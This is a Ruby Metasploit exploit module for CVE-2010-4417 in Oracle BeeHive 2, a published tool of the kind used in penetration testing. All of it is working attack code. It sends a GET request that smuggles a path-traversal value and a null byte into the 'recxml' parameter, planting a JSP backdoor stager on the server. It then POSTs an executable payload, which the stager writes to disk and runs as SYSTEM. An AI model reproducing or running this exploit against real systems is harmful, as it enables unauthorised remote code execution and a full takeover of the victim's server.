##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Oracle BeeHive 2 voice-servlet processEvaluation() Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability found in Oracle BeeHive. The processEvaluation method
        found in voice-servlet can be abused to write a malicious file onto the target machine, and
        gain remote arbitrary code execution under the context of SYSTEM.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          '1c239c43f521145fa8385d64a9c32243',        # Found the vuln first
          'mr_me <steventhomasseeley[at]gmail.com>', # https://twitter.com/ae0n_ (overlapped finding & PoC)
          'sinn3r'                                   # Metasploit
        ],
      'References'     =>
        [
          [ 'CVE', '2010-4417' ],
          [ 'ZDI', '11-020' ],
          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html' ]
        ],
      'DefaultOptions'  =>
        {
          'RPORT' => 7777
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Oracle Beehive 2', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Jun 09 2010',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Oracle Beehive's base directory", '/'])
      ], self.class)
  end


  def check
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'voice-servlet', 'prompt-qa', 'showRecxml.jsp'))

    if res && /RECXML Prompt Tester/ === res.body
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  def exploit
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::NotVulnerable, 'Target does not appear to be Oracle BeeHive')
    end

    # Init some names
    exe_name = "#{Rex::Text.rand_text_alpha(5)}.exe"
    stager_name = "#{Rex::Text.rand_text_alpha(5)}.jsp"

    print_status("Stager name is: #{stager_name}")
    print_status("Executable name is: #{exe_name}")

    # pwd:
    # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\home
    # Targeted path:
    # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\BEEAPP\applications\voice-servlet\voice-servlet\prompt-qa
    register_files_for_cleanup(
      "../BEEAPP/applications/voice-servlet/voice-servlet/prompt-qa/#{stager_name}"
    )


    # Ok fire!
    print_status("Uploading stager...")
    res = upload_stager(stager_name, exe_name)

    # Hmm if we fail to upload the stager, no point to continue.
    unless res
      fail_with(Failure::Unknown, 'Connection timed out.')
    end

    print_status("Uploading payload...")
    upload_payload(stager_name)
  end


  # Our stager is basically a backdoor that allows us to upload an executable with a POST request.
  def get_jsp_stager(exe_name)
    jsp = %Q|<%@ page import="java.io.*" %>
<%
  ByteArrayOutputStream buf = new ByteArrayOutputStream();
  BufferedReader reader = request.getReader();
  int tmp;
  while ((tmp = reader.read()) != -1) { buf.write(tmp); }
  FileOutputStream fostream = new FileOutputStream("#{exe_name}");
  buf.writeTo(fostream);
  fostream.close();
  Runtime.getRuntime().exec("#{exe_name}");
%>|

    # Since we're sending it as a GET request, we want to keep it smaller so
    # we gsub stuff we don't want.
    jsp.gsub!("\n", '')
    jsp.gsub!('  ', ' ')
    Rex::Text.uri_encode(jsp)
  end


  # Stager will be found under:
  # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\BEEAPP\applications\voice-servlet\voice-servlet\prompt-qa\
  def upload_stager(stager_name, exe_name)
    jsp_stager = get_jsp_stager(exe_name)
    uri = normalize_uri(target_uri.path, 'voice-servlet', 'prompt-qa', 'showRecxml.jsp')
    send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'encode_params' => false, # Don't encode %00 for us
      'vars_get' => {
        'evaluation' => jsp_stager,
        'recxml' => "..\\#{stager_name}%00"
      }
    })
  end

  # Payload will be found under:
  # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\home\
  def upload_payload(stager_name)
    uri = normalize_uri(target_uri.path, 'voice-servlet', 'prompt-qa', stager_name)
    send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'data' => generate_payload_exe(code: payload.encoded)
    })
  end

  def print_status(msg)
    super("#{rhost}:#{rport} - #{msg}")
  end

end